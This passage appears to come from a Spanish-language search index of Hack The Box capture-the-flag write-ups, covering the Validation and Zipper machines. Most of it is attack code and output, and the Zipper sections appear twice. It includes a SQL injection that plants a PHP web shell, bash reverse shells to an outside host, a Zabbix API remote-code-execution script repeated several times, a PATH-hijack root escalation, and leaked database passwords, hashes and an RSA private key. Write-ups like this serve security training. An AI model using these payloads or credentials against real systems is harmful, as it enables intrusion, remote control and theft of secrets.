http://10.10.11.116/ Accept-Encoding: gzip, deflate Accept-Language: es-ES,es;q=0.9 Cookie: user=0bd6506986ec42e732ffb866d33bb14e Connection: close username=special&country='order by 2# Error response: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Inyecci\u00f3n con union select: username=special&country='union select version()# Response: Welcome special Other Players In 'union select version()# 10.5.11-MariaDB-1","title":"SQLi"},{"location":"maquinas/linux/validation/#explotation-intrusion-en-contenedor-1722106","text":"Se utiliza la siguiente inyecci\u00f3n para penetrar en la m\u00e1quina: POST / HTTP/1.1 Host: 10.10.11.116 Content-Length: 119 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.10.11.116 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.10.11.116/ Accept-Encoding: gzip, deflate Accept-Language: es-ES,es;q=0.9 Cookie: user=0bd6506986ec42e732ffb866d33bb14e Connection: close username=special&country='union select \"<?php echo shell_exec($_REQUEST['cmd']); ?>\" into outfile \"/var/www/html/shell.php\"-- - # Desde un navegador con un socket en escucha se ejecuta shell reversa: http://10.10.11.116/loko.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.11/443 0>%261' Shell alternativa: echo \"<?php popen('bash -c \\\"bash -i >& /dev/tcp/10.10.14.11/8443 0>&1\\\"',\" r \"); ?>\" > hola.php","title":"Explotation - Intrusion en contenedor (172.21.0.6)"},{"location":"maquinas/linux/validation/#escalado-a-root","text":"Se capturan credenciales y son validas para iniciar como root: www-data@validation:/var/www/html$ cat config.php <?php $servername = \"127.0.0.1\" ; $username = \"uhc\" ; $password = \"uhc-9qual-global-pw\" ; $dbname = \"registration\" ; $conn = new mysqli ( $servername , $username , $password , $dbname ) ; ?> Utilizar la key filtrada y el payload para generar un token para inyectarlo posteriormente: root@validation:~# cat root.txt f2be6c1cb1a7e9e0453558a189c2d8e6 root@validation:~# cat /home/htb/user.txt 5d0183c4e54fdbd6534bccf02b6a720e","title":"Escalado a root:"},{"location":"maquinas/linux/zipper/","text":"Zipper HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.108 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.10.108 Se realiza un scan de los puertos abiertos: nmap -sVC -p22,80,10050 10.10.10.108 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 12:56 CEST Nmap scan report for 10.10.10.108 Host is up (0.041s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA) | 256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA) |_ 256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 10050/tcp open tcpwrapped Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds Fuzzing: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.108/FUZZ -t 300 -r -e .zip,.gz,.php,.html /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.108/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .zip .gz .php .html :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 300 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 136ms] zabbix [Status: 200, Size: 3105, Words: 158, Lines: 32, Duration: 669ms] .php [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 96ms] [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 99ms] Explotaci\u00f3n - Zabbix RCE Se accede a la ruta zabbix y se puede acceder como guest , mirando dentro se encuentran los hostid 10105 / 10106 y el user zapper , el cual autentica con la password zapper pero tiene el GUI deshabilitado, se modifica el siguiente exploit y aunque con ambos id se obtiene ejecuci\u00f3n en el mismo host: #!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://10.10.10.108/zabbix' ### Zabbix IP-address url = ZABIX_ROOT + '/api_jsonrpc.php' ### Don't edit login = 'zapper' ### Zabbix login password = 'zapper' ### Zabbix password hostid = '10105' ### Zabbix hostid ### auth payload = { \"jsonrpc\" : \"2.0\" , \"method\" : \"user.login\" , \"params\" : { 'user' : \"\" + login + \"\" , 'password' : \"\" + password + \"\" , }, \"auth\" : None , \"id\" : 0 , } headers = { 'content-type' : 'application/json' , } auth = requests . post ( url , data = json . dumps ( payload ), headers = ( headers )) auth = auth . json () while True : cmd = raw_input ( ' \\033 [41m[zabbix_cmd]>>: \\033 [0m ' ) if cmd == \"\" : print \"Result of last command:\" if cmd == \"quit\" : break ### update payload = { \"jsonrpc\" : \"2.0\" , \"method\" : \"script.update\" , \"params\" : { \"scriptid\" : \"1\" , \"command\" : \"\" + cmd + \"\" }, \"auth\" : auth [ 'result' ], \"id\" : 0 , } cmd_upd = requests . post ( url , data = json . dumps ( payload ), headers = ( headers )) ### execute payload = { \"jsonrpc\" : \"2.0\" , \"method\" : \"script.execute\" , \"params\" : { \"scriptid\" : \"1\" , \"hostid\" : \"\" + hostid + \"\" }, \"auth\" : auth [ 'result' ], \"id\" : 0 , } cmd_exe = requests . post ( url , data = json . dumps ( payload ), headers = ( headers )) cmd_exe = cmd_exe . json () print cmd_exe [ \"result\" ][ \"value\" ] Comando nohup para independizar el proceso y que no muera al morir el proceso padre: bash -c \"nohup bash -i >& /dev/tcp/10.10.14.11/443 0>&1 &\" Estamos en un contenedor, revisando se encuentra esta configuraci\u00f3n: zabbix@692ae48e0bad:/etc/zabbix/web$ cat zabbix.conf.php <?php // Zabbix GUI configuration file. global $DB ; $DB [ 'TYPE' ] = 'MYSQL' ; $DB [ 'SERVER' ] = 'localhost' ; $DB [ 'PORT' ] = '0' ; $DB [ 'DATABASE' ] = 'zabbixdb' ; $DB [ 'USER' ] = 'zabbix' ; $DB [ 'PASSWORD' ] = 'f.YMeMd$pTbpY3-449' ; // Schema name. Used for IBM DB2 and PostgreSQL. $DB [ 'SCHEMA' ] = '' ; $ZBX_SERVER = 'localhost' ; $ZBX_SERVER_PORT = '10051' ; $ZBX_SERVER_NAME = 'Zabbix' ; $IMAGE_FORMAT_DEFAULT = IMAGE_FORMAT_PNG ; Aqu\u00ed lo mismo se eliminan espacios con sed: zabbix@692ae48e0bad:/etc/zabbix$ cat zabbix_server.conf | grep -v '#' | sed '/^\\s*$/d' Con dicha configuracion nos podemos conectar a la bbdd de mysql en el puerto por defecto (3306) y se obtienen los siguientes hashes y recuerda que existe el usuario admin: zabbix@692ae48e0bad:/backups$ mysql -h 127 .0.0.1 -u zabbix -D zabbixdb -p mysql> select alias,passwd from users ; +--------+----------------------------------+ | alias | passwd | +--------+----------------------------------+ | Admin | 65e730e044402ef2e2f386a18ec03c72 | **password leakeada** | guest | d41d8cd98f00b204e9800998ecf8427e | **blank** | zapper | 16a7af0e14037b567d7782c4ef1bdeda | **zapper** +--------+----------------------------------+ Se accede al panel de Zabbix como admin y se pueden ver que uno de los hostsid tiene conectividad por ZBX: Consultando la documentaci\u00f3n se puede ver que hay una propiedad para ejecutar los scripts en el servidor o en el agente (\"execute_on\": \"0\",), y se modifica el exploit para acceder al servidor: zabbix doc ~~~python2 catn zabbix_RCE2.py #!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://10.10.10.108/zabbix' ### Zabbix IP-address url = ZABIX_ROOT + '/api_jsonrpc.php' ### Don't edit login = 'admin' ### Zabbix login password = 'f.YMeMd$pTbpY3-449' ### Zabbix password hostid = '10106' ### Zabbix hostid ### auth payload = { \"jsonrpc\" : \"2.0\", \"method\" : \"user.login\", \"params\": { 'user': \"\"+login+\"\", 'password': \"\"+password+\"\", }, \"auth\" : None, \"id\" : 0, } headers = { 'content-type': 'application/json', } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input('\\033[41m[zabbix_cmd]>>: \\033[0m ') if cmd == \"\" : print \"Result of last command:\" if cmd == \"quit\" : break ### update payload = { \"jsonrpc\": \"2.0\", \"method\": \"script.update\", \"params\": { \"scriptid\": \"1\", \"execute_on\": \"0\", \"command\": \"\"+cmd+\"\" }, \"auth\" : auth['result'], \"id\" : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ### execute payload = { \"jsonrpc\": \"2.0\", \"method\": \"script.execute\", \"params\": { \"scriptid\": \"1\", \"hostid\": \"\"+hostid+\"\" }, \"auth\" : auth['result'], \"id\" : 0, } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() print cmd_exe[\"result\"][\"value\"] ~~~ Lateral Movement - zabbix to zapper Se encuentra la password con la que cifra los backups y resulta que es tambien la de acceso a su sesi\u00f3n: zabbix@zipper:/home/zapper/utils$ cat backup.sh #!/bin/bash # # Quick script to backup all utilities in this folder to /backups # /usr/bin/7z a /backups/zapper_backup- $( /bin/date +%F ) .7z -pZippityDoDah /home/zapper/utils/* & >/dev/null zapper@zipper:~$ cat user.txt aa29e93f48c64f8586448b6f6e38fe33 Se copia la id_rsa por si acaso: zapper@zipper:~/.ssh$ cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67 GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+ eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M 2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz +docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo 84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4 aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa 8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0 oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+ zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe 8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur 7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ= -----END RSA PRIVATE KEY----- Escalate Privileges - root (shell) Se encuentra binario con suid: zapper@zipper:~/utils$ find / -perm -4000 -type f 2>/dev/null /home/zapper/utils/zabbix-service <=== /bin/ntfs-3g /bin/umount /bin/fusermount /bin/ping /bin/su Haciendo un strings se ve que la ruta de systemctl no es absoluta y se puede hacer un path hickjacking: zapper@zipper:~/utils$ nano systemctl zapper@zipper:~/utils$ cat systemctl #!/bin/bash chmod 4755 /bin/bash zapper@zipper:~/utils$ chmod +x systemctl zapper@zipper:~/utils$ ls -la total 24 drwxrwxr-x 2 zapper zapper 4096 Aug 7 13 :31 . drwxr-xr-x 6 zapper zapper 4096 Sep 9 2018 .. -rwxr-xr-x 1 zapper zapper 194 Sep 8 2018 backup.sh -rwxrwxr-x 1 zapper zapper 34 Aug 7 13 :31 systemctl -rwsr-sr-x 1 root root 7556 Sep 8 2018 zabbix-service zapper@zipper:~/utils$ export PATH = .: $PATH zapper@zipper:~/utils$ . \\z abbix-service zapper@zipper:~/utils$ ls -la /bin/bash -rwsr-xr-x 1 root root 1235608 Apr 4 2018 /bin/bash zapper@zipper:~/utils$ /bin/bash -p bash-4.4# whoami root bash-4.4# cat /root/root.txt a7c743d35b8efbedfd9336492a8eab6e","title":"Zipper"},{"location":"maquinas/linux/zipper/#zipper-htb","text":"","title":"Zipper HTB"},{"location":"maquinas/linux/zipper/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.108","title":"Recon"},{"location":"maquinas/linux/zipper/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.10.108 Se realiza un scan de los puertos abiertos: nmap -sVC -p22,80,10050 10.10.10.108 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 12:56 CEST Nmap scan report for 10.10.10.108 Host is up (0.041s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA) | 256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA) |_ 256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 10050/tcp open tcpwrapped Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds Fuzzing: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.108/FUZZ -t 300 -r -e .zip,.gz,.php,.html /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.108/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .zip .gz .php .html :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 300 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 136ms] zabbix [Status: 200, Size: 3105, Words: 158, Lines: 32, Duration: 669ms] .php [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 96ms] [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 99ms]","title":"Enum"},{"location":"maquinas/linux/zipper/#explotacion-zabbix-rce","text":"Se accede a la ruta zabbix y se puede acceder como guest , mirando dentro se encuentran los hostid 10105 / 10106 y el user zapper , el cual autentica con la password zapper pero tiene el GUI deshabilitado, se modifica el siguiente exploit y aunque con ambos id se obtiene ejecuci\u00f3n en el mismo host: #!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://10.10.10.108/zabbix' ### Zabbix IP-address url = ZABIX_ROOT + '/api_jsonrpc.php' ### Don't edit login = 'zapper' ### Zabbix login password = 'zapper' ### Zabbix password hostid = '10105' ### Zabbix hostid ### auth payload = { \"jsonrpc\" : \"2.0\" , \"method\" : \"user.login\" , \"params\" : { 'user' : \"\" + login + \"\" , 'password' : \"\" + password + \"\" , }, \"auth\" : None , \"id\" : 0 , } headers = { 'content-type' : 'application/json' , } auth = requests . post ( url , data = json . dumps ( payload ), headers = ( headers )) auth = auth . json () while True : cmd = raw_input ( ' \\033 [41m[zabbix_cmd]>>: \\033 [0m ' ) if cmd == \"\" : print \"Result of last command:\" if cmd == \"quit\" : break ### update payload = { \"jsonrpc\" : \"2.0\" , \"method\" : \"script.update\" , \"params\" : { \"scriptid\" : \"1\" , \"command\" : \"\" + cmd + \"\" }, \"auth\" : auth [ 'result' ], \"id\" : 0 , } cmd_upd = requests . post ( url , data = json . dumps ( payload ), headers = ( headers )) ### execute payload = { \"jsonrpc\" : \"2.0\" , \"method\" : \"script.execute\" , \"params\" : { \"scriptid\" : \"1\" , \"hostid\" : \"\" + hostid + \"\" }, \"auth\" : auth [ 'result' ], \"id\" : 0 , } cmd_exe = requests . post ( url , data = json . dumps ( payload ), headers = ( headers )) cmd_exe = cmd_exe . json () print cmd_exe [ \"result\" ][ \"value\" ] Comando nohup para independizar el proceso y que no muera al morir el proceso padre: bash -c \"nohup bash -i >& /dev/tcp/10.10.14.11/443 0>&1 &\" Estamos en un contenedor, revisando se encuentra esta configuraci\u00f3n: zabbix@692ae48e0bad:/etc/zabbix/web$ cat zabbix.conf.php <?php // Zabbix GUI configuration file. global $DB ; $DB [ 'TYPE' ] = 'MYSQL' ; $DB [ 'SERVER' ] = 'localhost' ; $DB [ 'PORT' ] = '0' ; $DB [ 'DATABASE' ] = 'zabbixdb' ; $DB [ 'USER' ] = 'zabbix' ; $DB [ 'PASSWORD' ] = 'f.YMeMd$pTbpY3-449' ; // Schema name. Used for IBM DB2 and PostgreSQL. $DB [ 'SCHEMA' ] = '' ; $ZBX_SERVER = 'localhost' ; $ZBX_SERVER_PORT = '10051' ; $ZBX_SERVER_NAME = 'Zabbix' ; $IMAGE_FORMAT_DEFAULT = IMAGE_FORMAT_PNG ; Aqu\u00ed lo mismo se eliminan espacios con sed: zabbix@692ae48e0bad:/etc/zabbix$ cat zabbix_server.conf | grep -v '#' | sed '/^\\s*$/d' Con dicha configuracion nos podemos conectar a la bbdd de mysql en el puerto por defecto (3306) y se obtienen los siguientes hashes y recuerda que existe el usuario admin: zabbix@692ae48e0bad:/backups$ mysql -h 127 .0.0.1 -u zabbix -D zabbixdb -p mysql> select alias,passwd from users ; +--------+----------------------------------+ | alias | passwd | +--------+----------------------------------+ | Admin | 65e730e044402ef2e2f386a18ec03c72 | **password leakeada** | guest | d41d8cd98f00b204e9800998ecf8427e | **blank** | zapper | 16a7af0e14037b567d7782c4ef1bdeda | **zapper** +--------+----------------------------------+ Se accede al panel de Zabbix como admin y se pueden ver que uno de los hostsid tiene conectividad por ZBX: Consultando la documentaci\u00f3n se puede ver que hay una propiedad para ejecutar los scripts en el servidor o en el agente (\"execute_on\": \"0\",), y se modifica el exploit para acceder al servidor: zabbix doc ~~~python2 catn zabbix_RCE2.py #!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://10.10.10.108/zabbix' ### Zabbix IP-address url = ZABIX_ROOT + '/api_jsonrpc.php' ### Don't edit login = 'admin' ### Zabbix login password = 'f.YMeMd$pTbpY3-449' ### Zabbix password hostid = '10106' ### Zabbix hostid ### auth payload = { \"jsonrpc\" : \"2.0\", \"method\" : \"user.login\", \"params\": { 'user': \"\"+login+\"\", 'password': \"\"+password+\"\", }, \"auth\" : None, \"id\" : 0, } headers = { 'content-type': 'application/json', } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input('\\033[41m[zabbix_cmd]>>: \\033[0m ') if cmd == \"\" : print \"Result of last command:\" if cmd == \"quit\" : break ### update payload = { \"jsonrpc\": \"2.0\", \"method\": \"script.update\", \"params\": { \"scriptid\": \"1\", \"execute_on\": \"0\", \"command\": \"\"+cmd+\"\" }, \"auth\" : auth['result'], \"id\" : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ### execute payload = { \"jsonrpc\": \"2.0\", \"method\": \"script.execute\", \"params\": { \"scriptid\": \"1\", \"hostid\": \"\"+hostid+\"\" }, \"auth\" : auth['result'], \"id\" : 0, } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() print cmd_exe[\"result\"][\"value\"] ~~~","title":"Explotaci\u00f3n - Zabbix RCE"},{"location":"maquinas/linux/zipper/#lateral-movement-zabbix-to-zapper","text":"Se encuentra la password con la que cifra los backups y resulta que es tambien la de acceso a su sesi\u00f3n: zabbix@zipper:/home/zapper/utils$ cat backup.sh #!/bin/bash # # Quick script to backup all utilities in this folder to /backups # /usr/bin/7z a /backups/zapper_backup- $( /bin/date +%F ) .7z -pZippityDoDah /home/zapper/utils/* & >/dev/null zapper@zipper:~$ cat user.txt aa29e93f48c64f8586448b6f6e38fe33 Se copia la id_rsa por si acaso: zapper@zipper:~/.ssh$ cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67 GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+ eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M 2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz +docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo 84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4 aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa 8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0 oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+ zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe 8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur 7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ= -----END RSA PRIVATE KEY-----","title":"Lateral Movement - zabbix to zapper"},{"location":"maquinas/linux/zipper/#escalate-privileges-root-shell","text":"Se encuentra binario con suid: zapper@zipper:~/utils$ find / -perm -4000 -type f 2>/dev/null /home/zapper/utils/zabbix-service <=== /bin/ntfs-3g /bin/umount /bin/fusermount /bin/ping /bin/su Haciendo un strings se ve que la ruta de systemctl no es absoluta y se puede hacer un path hickjacking: zapper@zipper:~/utils$ nano systemctl zapper@zipper:~/utils$ cat systemctl #!/bin/bash chmod 4755 /bin/bash zapper@zipper:~/utils$ chmod +x systemctl zapper@zipper:~/utils$ ls -la total 24 drwxrwxr-x 2 zapper zapper 4096 Aug 7 13 :31 . drwxr-xr-x 6 zapper zapper 4096 Sep 9 2018 .. -rwxr-xr-x 1 zapper zapper 194 Sep 8 2018 backup.sh -rwxrwxr-x 1 zapper zapper 34 Aug 7 13 :31 systemctl -rwsr-sr-x 1 root root 7556 Sep 8 2018 zabbix-service zapper@zipper:~/utils$ export PATH = .: $PATH zapper@zipper:~/utils$ . \\z abbix-service zapper@zipper:~/utils$ ls -la /bin/bash -rwsr-xr-x 1 root root 1235608 Apr 4 2018 /bin/bash zapper@zipper:~/utils$ /bin/bash -p bash-4.4# whoami root bash-4.4# cat /root/root.txt a7c743d35b8efbedfd9336492a8eab6e","title":"Escalate Privileges - root (shell)"},{"location":"maquinas/windows/arkham/","text":"Arkham HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.130 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.10.130 Se realiza un scan de los puertos abiertos: nmap -sVC -p80,135,139,445,8080,49666,49667 10.10.10.130 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-06 18:29 CEST Nmap scan report for 10.10.10.130 Host is up (0.045s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 8080/tcp open http Apache Tomcat 8.5.37 |_http-title: Mask Inc. | http-methods: |_ 